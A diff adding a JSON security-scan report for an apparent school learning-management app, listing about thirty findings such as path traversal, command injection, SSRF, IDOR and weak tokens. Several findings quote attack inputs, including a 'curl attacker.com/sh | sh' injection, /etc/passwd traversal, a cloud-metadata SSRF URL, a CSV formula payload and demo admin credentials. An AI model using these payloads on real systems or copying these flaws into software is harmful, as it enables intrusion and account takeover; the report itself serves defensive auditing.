@@ -1,0 +1,833 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.path-traversal.download-route",
+      "path": "src/app/api/download/[category]/[filename]/route.ts",
+      "start": {
+        "line": 19,
+        "col": 5,
+        "offset": 480
+      },
+      "end": {
+        "line": 20,
+        "col": 42,
+        "offset": 560
+      },
+      "extra": {
+        "message": "Path traversal: `join(process.cwd(), UPLOAD_DIR, params.category, params.filename)` uses URL path parameters directly with no sanitization. An authenticated user can request `/api/download/..%2F..%2F..%2Fetc%2Fpasswd` (or traverse via the filename segment) to read arbitrary files on the server, including source code, `.env` files, and other users' uploads outside the intended directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor.download-route",
+      "path": "src/app/api/download/[category]/[filename]/route.ts",
+      "start": {
+        "line": 13,
+        "col": 3,
+        "offset": 300
+      },
+      "end": {
+        "line": 20,
+        "col": 42,
+        "offset": 560
+      },
+      "extra": {
+        "message": "Broken access control / IDOR: the download handler only checks that a session exists (`if (!session.userId)`) and never verifies that the requested file belongs to the requesting user (e.g., that it is their own submission file, or that they teach the course). Any authenticated user \u2014 e.g. a student \u2014 can enumerate and download any other user's uploaded files (submissions, materials) stored under the uploads directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection.pandoc",
+      "path": "src/lib/resource-convert.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 280
+      },
+      "end": {
+        "line": 11,
+        "col": 75,
+        "offset": 355
+      },
+      "extra": {
+        "message": "OS command injection: `execSync(`pandoc ${sourcePath} --to=${format} -o ${outputPath}`)` interpolates `sourcePath` and `format` into a shell command string. Both values come directly from the request body of POST /api/instructor/resources/convert (route.ts line 12: `const { resourceId, sourcePath, format } = await request.json()`), and `format` is not validated against the ALLOWED_RUBRIC_FORMATS list used by the sibling function. An instructor/TA can supply values like `format: \"pdf; curl attacker.com/sh | sh\"` or shell substitution in sourcePath to achieve remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.rubric-export-read",
+      "path": "src/app/api/instructor/resources/rubric-export/route.ts",
+      "start": {
+        "line": 44,
+        "col": 3,
+        "offset": 1150
+      },
+      "end": {
+        "line": 51,
+        "col": 42,
+        "offset": 1340
+      },
+      "extra": {
+        "message": "Arbitrary file read: the `outputPath` query parameter is passed straight to `readFile(outputPath)` with no validation that it is inside the rubrics output directory. Any instructor/TA can request `?outputPath=/etc/passwd` (or `.env`, source files, uploads of other users) and the raw file contents are streamed back in the response.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.resource-metadata-fetch",
+      "path": "src/lib/resource-cache.ts",
+      "start": {
+        "line": 34,
+        "col": 3,
+        "offset": 950
+      },
+      "end": {
+        "line": 36,
+        "col": 40,
+        "offset": 1050
+      },
+      "extra": {
+        "message": "Server-Side Request Forgery: `importExternalResourceMetadata(sourceUrl)` calls `fetch(sourceUrl)` on a fully user-controlled URL with no scheme/host validation. It is invoked from `createCourseResourceEntry` where `sourceUrl` comes directly from the request body (line 76), so any instructor/TA can make the server fetch internal-only endpoints such as `http://169.254.169.254/latest/meta-data/`, `http://localhost:.../admin`, or internal RFC1918 services, and the fetched content is partially reflected in the resource description. Note the contrast with `sendWebhookTestPing` in webhook-dispatch.ts which validates the URL \u2014 no such check exists here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.resource-note-write",
+      "path": "src/lib/resource-cache.ts",
+      "start": {
+        "line": 23,
+        "col": 3,
+        "offset": 640
+      },
+      "end": {
+        "line": 28,
+        "col": 28,
+        "offset": 830
+      },
+      "extra": {
+        "message": "Path traversal (write): `cacheResourceNote` builds `join(process.cwd(), CACHE_DIR, 'resource-notes', category)` and `join(dir, `${title}.txt`)` using `category` and `title` taken verbatim from the request body in `createCourseResourceEntry` (line 76, invoked at line 97). An instructor can send `category: \"../../../../..\"` and/or a `title` containing `../` segments to write attacker-controlled `.txt` content to arbitrary locations on the filesystem (e.g. overwriting config files or planting files in web-accessible directories).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.resource-note-read",
+      "path": "src/app/api/instructor/resources/route.ts",
+      "start": {
+        "line": 43,
+        "col": 5,
+        "offset": 1250
+      },
+      "end": {
+        "line": 44,
+        "col": 44,
+        "offset": 1340
+      },
+      "extra": {
+        "message": "Path traversal (read): GET handler builds `join(process.cwd(), CACHE_DIR, 'resource-notes', resource.category, `${resource.title}.txt`)` from the stored `category` and `title`, which are never sanitized when the resource is created (see createCourseResourceEntry in resource-cache.ts). An instructor can create a resource with `category: \"../../../..\"` and a traversal-containing title, then call this endpoint with its resourceId to read arbitrary `.txt`-suffixed files anywhere on the server. The canTeachCourse check is satisfied because the attacker created the resource on their own course.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.general-upload-category",
+      "path": "src/lib/general-upload.ts",
+      "start": {
+        "line": 36,
+        "col": 5,
+        "offset": 950
+      },
+      "end": {
+        "line": 40,
+        "col": 30,
+        "offset": 1080
+      },
+      "extra": {
+        "message": "Path traversal (write): `storeGeneralAttachment` takes `category` from the multipart form data (line 21) and uses it unsanitized in `const relativePath = `${category}/${filename}`` followed by `join(process.cwd(), UPLOAD_DIR, relativePath)` and `writeFile(fullPath, buffer)`. Any authenticated user (including students) can upload a file with `category: \"../../..\"` to write arbitrary content (any extension is preserved from the original filename) to arbitrary directories outside the uploads root.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-random.password-reset-token",
+      "path": "src/lib/password-reset.ts",
+      "start": {
+        "line": 23,
+        "col": 5,
+        "offset": 620
+      },
+      "end": {
+        "line": 28,
+        "col": 6,
+        "offset": 800
+      },
+      "extra": {
+        "message": "Password reset tokens are generated with `Math.random().toString(36).substring(2, 20)` \u2014 a non-cryptographic PRNG that is predictable/brute-forceable. An attacker who can predict or enumerate reset tokens can call POST /api/auth/reset-password/confirm with a guessed token (there is no attempt limiting) and take over any account. Compare `resendEnrollmentInvite` in the same file which correctly uses `crypto.randomBytes(16)`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.reset-token-no-expiry-check",
+      "path": "src/lib/password-reset.ts",
+      "start": {
+        "line": 43,
+        "col": 3,
+        "offset": 1150
+      },
+      "end": {
+        "line": 50,
+        "col": 4,
+        "offset": 1350
+      },
+      "extra": {
+        "message": "Expired password reset links remain usable: `confirmPasswordReset` checks only `!record || record.usedAt` but never compares `record.expiresAt` against the current time before resetting the password (the code comment even acknowledges this). A reset link that leaked (e.g. from logs or an old email) can be replayed indefinitely to set a new password and hijack the account.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection.staff-lookup",
+      "path": "src/lib/staff-directory.ts",
+      "start": {
+        "line": 63,
+        "col": 3,
+        "offset": 1750
+      },
+      "end": {
+        "line": 66,
+        "col": 32,
+        "offset": 1880
+      },
+      "extra": {
+        "message": "LDAP filter injection: `findStaffByEmail` builds the filter as `(mail=${email})` without escaping. The `staffEmail` value comes directly from the request body of POST /api/instructor/courses (route.ts line 43) and is attacker-controlled, so metacharacters like `*`, `)(`, or `\\` reshape the directory query (e.g. `(mail=*)` returns arbitrary directory records). The sibling function `verifyDepartmentMembership` in the same file correctly escapes values with `escapeLdapFilterValue`, confirming the omission here is a flaw.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-authorization.extension-grant",
+      "path": "src/lib/extensions.ts",
+      "start": {
+        "line": 7,
+        "col": 3,
+        "offset": 180
+      },
+      "end": {
+        "line": 23,
+        "col": 3,
+        "offset": 640
+      },
+      "extra": {
+        "message": "Missing authorization: `grantSubmissionExtension` looks up the submission and immediately updates it without ever verifying that `grantedBy` teaches the submission's course \u2014 the `grantedBy`/`newDueDate` values are recorded but not checked. It is exposed via POST /api/instructor/assignments/extensions, so any instructor or teaching assistant can modify (clear the late flag on) any submission in any course, including courses they have no assignment to. The sibling function `toggleAssignmentVisibility` correctly performs a courseInstructors check, confirming this check was omitted.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.discussion-thread-create",
+      "path": "src/app/api/discussions/route.ts",
+      "start": {
+        "line": 16,
+        "col": 5,
+        "offset": 380
+      },
+      "end": {
+        "line": 23,
+        "col": 7,
+        "offset": 600
+      },
+      "extra": {
+        "message": "Broken access control: the POST handler inserts a discussion thread with `courseId: body.courseId` after checking only that a session exists \u2014 unlike the GET handler in the same file, it never calls `canAccessCourse(session.userId, courseId)`. Any authenticated user (e.g. a student not enrolled) can create discussion threads in any course, and input is not validated with the existing `discussionThreadSchema`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.discussion-comment-create",
+      "path": "src/app/api/discussions/comments/route.ts",
+      "start": {
+        "line": 14,
+        "col": 3,
+        "offset": 320
+      },
+      "end": {
+        "line": 20,
+        "col": 7,
+        "offset": 500
+      },
+      "extra": {
+        "message": "Broken access control: the comment POST handler inserts `discussionComments` with `threadId: body.threadId` after only checking that a session exists \u2014 it never verifies the caller can access the course that the thread belongs to (no canAccessCourse/canTeachCourse check). Any authenticated user can post comments to any discussion thread in any course, including courses they are not enrolled in.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor.discussion-detail-page",
+      "path": "src/app/discussions/[id]/page.tsx",
+      "start": {
+        "line": 26,
+        "col": 3,
+        "offset": 600
+      },
+      "end": {
+        "line": 45,
+        "col": 3,
+        "offset": 1200
+      },
+      "extra": {
+        "message": "IDOR on the discussion detail page: the thread is fetched with `where(eq(discussionThreads.id, params.id))` and rendered without any check that the current user is enrolled in or teaches the thread's course (the discussions list page correctly filters threads by the user's courseIds). Any authenticated user can read the full content and comments of any course's discussion thread by iterating thread IDs.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.submission-return",
+      "path": "src/lib/continuity-link.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 340
+      },
+      "end": {
+        "line": 16,
+        "col": 4,
+        "offset": 560
+      },
+      "extra": {
+        "message": "Open redirect: `resolveSubmissionReturnDestination` returns the `x-redirect-url` request header value verbatim with no allowlist or validation (contrast `resolveCoursePreviewReturnDestination` directly below, which enforces an allowlist). The value flows from the `?returnTo=` page URL parameter (submission-form.tsx line 34) into the header, is echoed back as `returnTo` in the API response, and the client navigates with `router.push(data.returnTo)` (submission-form.tsx lines 49-51). An attacker can craft `https://lms/student/assignments/<id>?returnTo=https://evil.com` so the victim is redirected to an attacker-controlled site after submitting.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-data.password-in-logs",
+      "path": "src/lib/activity-log.ts",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 500
+      },
+      "end": {
+        "line": 19,
+        "col": 5,
+        "offset": 620
+      },
+      "extra": {
+        "message": "Sensitive data exposure in logs: `recordRejectedResetSubmission(body)` logs the entire parsed request body via `console.warn`. The reset-password confirm body contains the user's new plaintext `password` (and reset token) per `newPasswordSchema`, so any validation failure (e.g. password under 8 chars) writes the would-be password to application logs. The sibling registration logger deliberately avoids logging raw form data, confirming the intent to keep credentials out of logs.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.user-enumeration.password-reset",
+      "path": "src/lib/password-reset.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 400
+      },
+      "end": {
+        "line": 21,
+        "col": 4,
+        "offset": 580
+      },
+      "extra": {
+        "message": "User enumeration: `requestPasswordReset` returns a distinct 404 'No account found with that email' for unknown addresses and 403 'This account has been deactivated' for disabled ones, which the reset-password page surfaces directly to the caller. This lets an unauthenticated attacker probe which emails have active accounts. The sibling `resendEnrollmentInvite` deliberately returns an identical response regardless of account existence, showing the intended pattern.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-204: Observable Response Discrepancy"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secret.default-session-secret",
+      "path": "src/lib/auth.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 460
+      },
+      "end": {
+        "line": 19,
+        "col": 110,
+        "offset": 570
+      },
+      "extra": {
+        "message": "Hardcoded fallback session encryption secret: `password: process.env.SESSION_SECRET || 'complex_password_at_least_32_characters_long_for_security'`. If SESSION_SECRET is not set, every deployment uses this publicly-known value from the source code. Since iron-session encrypts/signs the session cookie with this password, an attacker can forge a valid session cookie for any user (including school_admin) and achieve full authentication bypass.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-random.generated-password-admin-users",
+      "path": "src/app/api/admin/users/route.ts",
+      "start": {
+        "line": 30,
+        "col": 5,
+        "offset": 780
+      },
+      "end": {
+        "line": 31,
+        "col": 55,
+        "offset": 880
+      },
+      "extra": {
+        "message": "Account passwords are generated with `Math.random().toString(36).slice(-12) + 'Aa1!'` when the admin does not supply one. Math.random is not cryptographically secure and toString(36) yields ~5.9 bits/char, so generated passwords (including for school_admin accounts) are predictable to an attacker who can guess the PRNG state, and the plaintext password is also returned in the HTTP response (line 48).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-random.generated-password-import",
+      "path": "src/app/api/admin/import/users/route.ts",
+      "start": {
+        "line": 62,
+        "col": 7,
+        "offset": 1750
+      },
+      "end": {
+        "line": 63,
+        "col": 60,
+        "offset": 1860
+      },
+      "extra": {
+        "message": "Imported users receive default passwords generated with `Math.random().toString(36).slice(-12) + 'Aa1!'`, a non-cryptographic PRNG. Bulk-imported accounts (whose roles can include school_admin via the CSV `role` column, which is cast unvalidated with `role: role as any`) therefore get predictable passwords.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.upload.unrestricted-submission-upload",
+      "path": "src/app/api/student/submissions/route.ts",
+      "start": {
+        "line": 94,
+        "col": 5,
+        "offset": 2900
+      },
+      "end": {
+        "line": 102,
+        "col": 34,
+        "offset": 3200
+      },
+      "extra": {
+        "message": "Unrestricted file upload / denial of service: the submission handler writes any uploaded file to disk without enforcing `assignment.maxFileSize` (default 10MB) or `assignment.allowedFileTypes` \u2014 neither the declared limits nor any global cap is checked (contrast storeGeneralAttachment which enforces MAX_UPLOAD_SIZE). A student can repeatedly upload arbitrarily large files of any type to exhaust server disk space (each upload also creates a new submissionFiles row).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.resource-create-no-course-check",
+      "path": "src/lib/resource-cache.ts",
+      "start": {
+        "line": 75,
+        "col": 3,
+        "offset": 2100
+      },
+      "end": {
+        "line": 94,
+        "col": 30,
+        "offset": 2600
+      },
+      "extra": {
+        "message": "Broken access control: `createCourseResourceEntry` checks only the caller's role but never verifies with `canTeachCourse` that the instructor actually teaches `body.courseId` before inserting the courseResources row. Any instructor/TA can attach resource entries to courses they are not assigned to. The sibling `attachCourseMaterialFile` (line 130) does perform the canTeachCourse check, confirming the omission.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.assignment-update",
+      "path": "src/app/api/instructor/assignments/route.ts",
+      "start": {
+        "line": 104,
+        "col": 5,
+        "offset": 2900
+      },
+      "end": {
+        "line": 110,
+        "col": 26,
+        "offset": 3100
+      },
+      "extra": {
+        "message": "Mass assignment: the PUT handler spreads the raw request body into the update \u2014 `db.update(assignments).set({ ...data, ... })` where `data` is everything in the JSON body except `id`. Authorization is checked against the assignment's original courseId, but the body can include `courseId` to move the assignment into a course the instructor does not teach, or overwrite arbitrary columns. Unlike the POST handler, no zod schema (assignmentSchema) is applied.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-disclosure.stack-trace-export",
+      "path": "src/lib/export-diagnostics.ts",
+      "start": {
+        "line": 7,
+        "col": 3,
+        "offset": 220
+      },
+      "end": {
+        "line": 9,
+        "col": 80,
+        "offset": 330
+      },
+      "extra": {
+        "message": "Information disclosure: `buildExportErrorResponse` returns the full error `stack` whenever `detailLevel === 'full'`, and the caller passes the caller-controlled `detail` query parameter directly (`buildExportErrorResponse(error, searchParams.get('detail') || 'basic')` in admin/export/route.ts line 115). This exposes internal file paths, library versions and SQL details in API responses. The sibling `buildSyncErrorResponse` correctly gates expanded detail on NODE_ENV rather than caller input.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.csv-formula-export",
+      "path": "src/app/api/admin/export/route.ts",
+      "start": {
+        "line": 49,
+        "col": 9,
+        "offset": 1750
+      },
+      "end": {
+        "line": 49,
+        "col": 110,
+        "offset": 1900
+      },
+      "extra": {
+        "message": "CSV formula injection: exported values such as `row.studentFirstName`, `row.studentLastName`, `row.studentEmail` and `row.assignmentTitle` are self-registered, user-controlled fields concatenated into the CSV without neutralizing leading `=`, `+`, `-`, or `@` characters (also at lines 72 and 96). A student registering with first name `=cmd|'/C calc'!A1` achieves formula execution when an admin opens the exported report in Excel/Sheets.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1236: Improper Neutralization of Formula Elements in a CSV File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.cohort-packet-archive",
+      "path": "src/lib/report-archive.ts",
+      "start": {
+        "line": 10,
+        "col": 3,
+        "offset": 260
+      },
+      "end": {
+        "line": 18,
+        "col": 70,
+        "offset": 560
+      },
+      "extra": {
+        "message": "Path traversal in the cohort onboarding packet functions: `fetchCohortOnboardingPacket`/`saveCohortOnboardingPacket` build `join(REPORTS_DIR, `${cohortName}.txt`)` with the cohort name taken from the database without sanitization. A cohort name containing `../` sequences (cohort names are free-text at creation) causes the admin packet endpoints (admin/cohorts/packet) to read from or write to arbitrary `.txt` paths outside the reports directory. The sibling `fetchRosterSnapshot` correctly applies `basename()` plus a resolved-prefix check, confirming the intended hardening is missing here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.log-injection.discussion-search",
+      "path": "src/lib/activity-log.ts",
+      "start": {
+        "line": 5,
+        "col": 3,
+        "offset": 130
+      },
+      "end": {
+        "line": 7,
+        "col": 5,
+        "offset": 260
+      },
+      "extra": {
+        "message": "Log injection: `recordDiscussionSearchActivity` writes the raw `searchQuery` to the console without stripping CR/LF or NUL characters (contrast `recordExportRequestActivity` which sanitizes with `reason.replace(/[\\r\\n\\0]/g, ' ')`). The `q` parameter is logged in GET /api/discussions (route.ts line 43) before any course-access check, so any authenticated user can inject forged multi-line log entries to pollute or disguise the audit/activity trail.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfig.preview-cookie-missing-flags",
+      "path": "src/lib/course-preview.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 330
+      },
+      "end": {
+        "line": 14,
+        "col": 6,
+        "offset": 440
+      },
+      "extra": {
+        "message": "Insecure cookie configuration: the `lms_course_preview` cookie is set with only `path` and `maxAge` \u2014 no `httpOnly`, `secure`, or `sameSite` attributes. Its value (courseId:previewRole:token) is readable by any JavaScript on the page and is transmitted cross-site and over plain HTTP in production. The adjacent `trustPreviewDevice` cookie sets all of these flags correctly, confirming the omission.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-data.sis-token-in-url",
+      "path": "src/lib/sis-sync.ts",
+      "start": {
+        "line": 7,
+        "col": 3,
+        "offset": 200
+      },
+      "end": {
+        "line": 8,
+        "col": 6,
+        "offset": 280
+      },
+      "extra": {
+        "message": "Credentials in URL: `pushEnrollmentsToSis` sends the SIS integration token as a query-string parameter (`?token=${integrationToken}`) on a plain-HTTP base URL (SIS_BASE_URL defaults to `http://sis.internal.example.com`). The token will be recorded in server logs, proxies, and SIS access logs. The sibling `pushCourseCatalogToSis` correctly passes the token in an Authorization header over HTTPS.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.login-page-demo-accounts",
+      "path": "src/app/login/page.tsx",
+      "start": {
+        "line": 123,
+        "col": 9,
+        "offset": 4100
+      },
+      "end": {
+        "line": 128,
+        "col": 13,
+        "offset": 4350
+      },
+      "extra": {
+        "message": "Hardcoded credentials exposed in production UI: the login page renders working demo credentials for privileged accounts ('Admin: admin@lms.edu / password123', plus instructor and student accounts) matching the seeded database. Anyone viewing the public login page receives valid admin login details.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.unauthenticated-cbc.appeal-draft",
+      "path": "src/lib/appeal-state.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 400
+      },
+      "end": {
+        "line": 16,
+        "col": 6,
+        "offset": 560
+      },
+      "extra": {
+        "message": "Use of unauthenticated encryption: `sealAppealDraft`/`resumeAppealDraft` use AES-256-CBC with no MAC/auth tag, and the decrypt path returns distinguishable error reasons ('invalid padding' vs 'could not resume draft') that leak padding validity to the caller (PUT /api/student/appeals), creating a padding-oracle attack surface against the sealed wizard state. The sibling import-draft functions correctly use AES-256-GCM with an auth tag and collapse all failures to one generic error.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secret.appeal-state-default-key",
+      "path": "src/lib/appeal-state.ts",
+      "start": {
+        "line": 8,
+        "col": 3,
+        "offset": 300
+      },
+      "end": {
+        "line": 9,
+        "col": 110,
+        "offset": 400
+      },
+      "extra": {
+        "message": "Hardcoded fallback encryption keys: the appeal/import state secrets default to the literal strings 'appeal-state-dev-secret' and 'import-state-dev-secret' when environment variables are unset. With the defaults in effect, anyone who knows the source code can forge or decrypt sealed `draftState` blobs submitted to the appeal and import resume endpoints.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
